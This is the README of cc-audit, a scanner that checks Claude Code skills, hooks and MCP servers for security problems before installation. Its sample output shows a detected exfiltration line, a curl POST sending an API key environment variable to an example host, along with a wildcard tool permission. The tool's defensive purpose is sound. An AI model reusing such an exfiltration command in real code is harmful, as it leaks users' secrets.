# cc-audit

[![Crates.io](https://img.shields.io/crates/v/cc-audit.svg)](https://crates.io/crates/cc-audit)
[![Crates.io Downloads](https://img.shields.io/crates/d/cc-audit.svg)](https://crates.io/crates/cc-audit)
[![npm](https://img.shields.io/npm/v/@cc-audit/cc-audit)](https://www.npmjs.com/package/@cc-audit/cc-audit)
[![npm Downloads](https://img.shields.io/npm/dt/@cc-audit/cc-audit)](https://www.npmjs.com/package/@cc-audit/cc-audit)
[![Homebrew](https://img.shields.io/badge/homebrew-ryo--ebata%2Ftap-FBB040)](https://github.com/ryo-ebata/homebrew-tap)
[![GitHub Stars](https://img.shields.io/github/stars/ryo-ebata/cc-audit)](https://github.com/ryo-ebata/cc-audit)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![CI](https://github.com/ryo-ebata/cc-audit/workflows/CI/badge.svg)](https://github.com/ryo-ebata/cc-audit/actions)
[![codecov](https://codecov.io/gh/ryo-ebata/cc-audit/branch/main/graph/badge.svg)](https://codecov.io/gh/ryo-ebata/cc-audit)
[![docs.rs](https://docs.rs/cc-audit/badge.svg)](https://docs.rs/cc-audit)
[![MSRV](https://img.shields.io/badge/MSRV-1.85-blue.svg)](https://blog.rust-lang.org/)
[![Rust Edition](https://img.shields.io/badge/edition-2024-orange.svg)](https://doc.rust-lang.org/edition-guide/)

**Security auditor for Claude Code skills, hooks, and MCP servers.**

Scan third-party Claude Code artifacts for security vulnerabilities _before_ installation.

[日本語ドキュメント](./docs/README.ja.md)

## Why cc-audit?

The Claude Code ecosystem is growing rapidly, with thousands of Skills, Hooks, and MCP Servers distributed across marketplaces like [awesome-claude-code](https://github.com/hesreallyhim/awesome-claude-code). However:

> "Anthropic does not manage or audit any MCP servers."
> — [Claude Code Security Docs](https://code.claude.com/docs/en/security)

This creates a significant security gap. Users must trust third-party artifacts without verification, exposing themselves to:

- **Data Exfiltration** — API keys, SSH keys, and secrets sent to external servers
- **Privilege Escalation** — Unauthorized sudo access, filesystem destruction
- **Persistence** — Crontab manipulation, SSH authorized_keys modification
- **Prompt Injection** — Hidden instructions that hijack Claude's behavior
- **Overpermission** — Wildcard tool access (`allowed-tools: *`)

**cc-audit** closes this gap by scanning artifacts before you install them.

## Installation

### Homebrew (macOS/Linux)

```bash
brew install ryo-ebata/tap/cc-audit
```

### Cargo (Rust)

```bash
cargo install cc-audit
```

### npm (Node.js)

```bash
# Run directly
npx @cc-audit/cc-audit check ./my-skill/

# Or install globally
npm install -g @cc-audit/cc-audit
cc-audit check ./my-skill/
```

### From Source

```bash
git clone https://github.com/ryo-ebata/cc-audit.git
cd cc-audit && cargo install --path .
```

### Direct Download

Download binaries from [GitHub Releases](https://github.com/ryo-ebata/cc-audit/releases).

## Quick Start

```bash
# Scan a skill directory
cc-audit check ./my-skill/

# Scan with JSON/HTML output
cc-audit check ./skill/ --format json --output results.json
cc-audit check ./skill/ --format html --output report.html

# Strict mode (includes medium/low severity)
cc-audit check ./skill/ --strict

# Scan different artifact types
cc-audit check --type mcp ~/.claude/mcp.json
cc-audit check --type docker ./
cc-audit check --type dependency ./

# Watch mode for development
cc-audit check --watch ./my-skill/

# Scan all installed AI coding clients
cc-audit check --all-clients

# Scan a specific client
cc-audit check --client cursor
cc-audit check --client claude

# Generate config file
cc-audit init

# Install pre-commit hook
cc-audit hook init
```

## Example Output

```
Scanning: ./awesome-skill/

scripts/setup.sh:42:1: [ERROR] [CRITICAL] EX-001: Network request with environment variable
     |
  42 | curl -X POST https://api.example.com -d "key=$ANTHROPIC_API_KEY"
     | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
     = why: Potential data exfiltration: network request with environment variable detected
     = ref: CWE-200, CWE-319
     = fix: Remove or encrypt sensitive data before transmission

SKILL.md:3:1: [ERROR] [HIGH] OP-001: Wildcard tool permission
     |
   3 | allowed-tools: *
     | ^^^^^^^^^^^^^^^^
     = why: Overly permissive tool access detected
     = ref: CWE-250
     = fix: Specify explicit tool permissions instead of wildcard

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Risk Score: 60/100 [██████░░░░] HIGH

Summary: 2 errors, 0 warnings (1 critical, 1 high, 0 medium, 0 low)
Result: FAIL (exit code 1)
```

## Commands

| Command | Description |
|---------|-------------|
| `check` | Scan paths for security vulnerabilities |
| `init`  | Generate a default configuration file |
| `hook`  | Manage Git pre-commit hooks |
| `serve` | Run as MCP server |
| `proxy` | Run as MCP proxy for runtime monitoring |

## Documentation

| Document                                   | Description                                         |
| ------------------------------------------ | --------------------------------------------------- |
| [CLI Reference](./docs/CLI.md)             | All command-line options                            |
| [Configuration](./docs/CONFIGURATION.md)   | Config files, custom rules, malware signatures      |
| [Detection Rules](./docs/RULES.md)         | All detection rules and severity levels             |
| [Advanced Features](./docs/FEATURES.md)    | Baseline/drift detection, auto-fix, MCP server mode |
| [CI/CD Integration](./docs/INTEGRATION.md) | GitHub Actions, GitLab CI, troubleshooting          |

## Key Features

- **100+ Detection Rules** — Exfiltration, privilege escalation, persistence, prompt injection, and more
- **Multiple Scan Types** — Skills, hooks, MCP servers, commands, Docker, dependencies, subagents, plugins
- **Multi-Client Support** — Auto-detect and scan Claude, Cursor, Windsurf, VS Code configurations
- **Remote Repository Scanning** — Scan GitHub repositories directly, including awesome-claude-code ecosystem
- **CVE Vulnerability Scanning** — Built-in database of known vulnerabilities in AI coding tools
- **Risk Scoring** — 0-100 score with category breakdown
- **Baseline/Drift Detection** — Prevent rug pull attacks
- **MCP Pinning** — Pin tool configurations to detect unauthorized changes
- **Auto-Fix** — Automatically fix certain issues
- **Multiple Output Formats** — Terminal, JSON, SARIF, HTML, Markdown
- **Security Badges** — Generate shields.io badges for your projects
- **SBOM Generation** — CycloneDX format support
- **Proxy Mode** — Runtime MCP monitoring with transparent proxy
- **Watch Mode** — Real-time scanning during development
- **CI/CD Ready** — SARIF output for GitHub Security integration

## Contributing

Contributions are welcome! Please read our [Contributing Guide](CONTRIBUTING.md) before submitting a Pull Request.

```bash
git clone https://github.com/ryo-ebata/cc-audit.git
cd cc-audit
cargo test
cargo build --release
```

## Related Projects

- [Claude Code](https://code.claude.com/) — Anthropic's official CLI for Claude
- [awesome-claude-code](https://github.com/hesreallyhim/awesome-claude-code) — Curated list of Claude Code resources
- [Model Context Protocol](https://modelcontextprotocol.io/) — MCP specification

## Security

If you discover a security vulnerability, please report it via [GitHub Security Advisories](https://github.com/ryo-ebata/cc-audit/security/advisories/new).

## License

[MIT](LICENSE)

---

**Scan before you install.**
